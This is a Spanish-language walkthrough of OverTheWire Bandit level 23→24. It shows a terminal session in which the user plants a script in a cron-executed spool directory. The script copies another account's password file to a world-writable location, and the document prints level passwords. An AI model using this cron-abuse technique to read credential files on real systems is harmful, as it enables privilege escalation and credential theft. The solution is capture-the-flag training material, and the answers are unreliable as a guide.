# Retos Bandit 
# Bandido Nivel 23 → Nivel 24
# Objetivo 
Un programa se ejecuta automáticamente a intervalos regulares desde **cron**, el programador de trabajos basado en el tiempo. Busque en **/etc/cron.d/** la configuración y ver qué comando se está ejecutando.

**NOTA:** Este nivel requiere que crees el tuyo propio primero shell-script. Este es un paso muy grande y del que deberías estar orgulloso ¡Tú mismo cuando superes este nivel!

**NOTA 2:** Tenga en cuenta que el script de shell se elimina una vez ejecutado, por lo que es posible que desee mantener una copia a mano...

# Datos de acceso al nivel 
bandit23
ssh -l bandit23 bandit.labs.overthewire.org -p 2220
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
# Solución 
```
bandit23@bandit:~$ ls -la /etc/cron.d/
total 56
drwxr-xr-x   2 root root  4096 Oct  5 06:20 .
drwxr-xr-x 106 root root 12288 Oct  5 06:20 ..
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit22
-rw-r--r--   1 root root   122 Oct  5 06:19 cronjob_bandit23
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit24
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Oct  5 06:20 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ cd /var/spool/bandit24
bandit23@bandit:/var/spool/bandit24$ ls -la
total 12
dr-xr-x---  3 bandit24 bandit23 4096 Oct  5 06:19 .
drwxr-xr-x  5 root     root     4096 Oct  5 06:19 ..
drwxrwx-wx 90 root     bandit24 4096 Feb 27 04:32 foo
bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/passtmp1
mkdir: cannot create directory ‘/tmp/passtmp1’: File exists
bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/passtmp2
bandit23@bandit:/var/spool/bandit24$ cd /tmp/passtmp2
bandit23@bandit:/tmp/passtmp2$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/passtmp2/password" > mio.sh
bandit23@bandit:/tmp/passtmp2$ chom 777 mio.sh
Command 'chom' not found, did you mean:
  command 'choom' from deb util-linux (2.37.2-4ubuntu3)
  command 'ccom' from deb pcc (1.2.0~DEVEL+20200630-2)
  command 'whom' from deb mailutils-mh (1:3.14-1)
  command 'whom' from deb mmh (0.4-4)
  command 'whom' from deb nmh (1.7.1-11)
  command 'chem' from deb groff (1.22.4-8build1)
Try: apt install <deb name>
bandit23@bandit:/tmp/passtmp2$ chmod 777 mio.sh
bandit23@bandit:/tmp/passtmp2$ cat mio.sh
cat /etc/bandit_pass/bandit24 >> /tmp/passtmp2/password
bandit23@bandit:/tmp/passtmp2$ ls -la mio.sh
-rwxrwxrwx 1 bandit23 bandit23 56 Feb 27 04:38 mio.sh
bandit23@bandit:/tmp/passtmp2$ touch password
bandit23@bandit:/tmp/passtmp2$ chmod 644 password
bandit23@bandit:/tmp/passtmp2$ ls -la password
-rw-r--r-- 1 bandit23 bandit23 0 Feb 27 04:39 password
bandit23@bandit:/tmp/passtmp2$ chmod 666 password
bandit23@bandit:/tmp/passtmp2$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 0 Feb 27 04:39 password
bandit23@bandit:/tmp/passtmp2$ cd ..
bandit23@bandit:/tmp$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/tmp$ cd passtmp2
bandit23@bandit:/tmp/passtmp2$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 04:39 .
drwxrwx-wt 646 root     root     405504 Feb 27 04:40 ..
-rwxrwxrwx   1 bandit23 bandit23     56 Feb 27 04:38 mio.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 27 04:39 password
bandit23@bandit:/tmp/passtmp2$ cp mio.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/passtmp2$ cp mio.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/passtmp2$ cp /var/spool/bandit24/mio.sh
cp: missing destination file operand after '/var/spool/bandit24/mio.sh'
Try 'cp --help' for more information.
bandit23@bandit:/tmp/passtmp2$ cp mio.sh /var/spool/bandit/
cp: cannot create regular file '/var/spool/bandit/': Not a directory
bandit23@bandit:/tmp/passtmp2$ cp mio.sh  /var/spool/bandit24/
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/passtmp2$ cp mio.sh /var/spool/bandit24/
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/passtmp2$ ls -al /var/spool/bandit24/mio.sh
ls: cannot access '/var/spool/bandit24/mio.sh': No such file or directory
bandit23@bandit:/tmp/passtmp2$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ cd
bandit23@bandit:~$ cd tmp/passtmp2
-bash: cd: tmp/passtmp2: No such file or directory
bandit23@bandit:~$ cd /tmp/passtmp2
bandit23@bandit:/tmp/passtmp2$ cd mio.sh /var/spool/bandit24/foo
-bash: cd: too many arguments
bandit23@bandit:/tmp/passtmp2$ cp mio.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/passtmp2$ date
Tue Feb 27 04:56:33 AM UTC 2024
bandit23@bandit:/tmp/passtmp2$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 04:39 .
drwxrwx-wt 668 root     root     405504 Feb 27 04:56 ..
-rwxrwxrwx   1 bandit23 bandit23     56 Feb 27 04:38 mio.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 27 04:39 password
bandit23@bandit:/tmp/passtmp2$ ls -la
total 412
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 04:39 .
drwxrwx-wt 668 root     root     405504 Feb 27 04:57 ..
-rwxrwxrwx   1 bandit23 bandit23     56 Feb 27 04:38 mio.sh
-rw-rw-rw-   1 bandit23 bandit23     33 Feb 27 04:57 password
bandit23@bandit:/tmp/passtmp2$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/passtmp2$
```
# Notas 

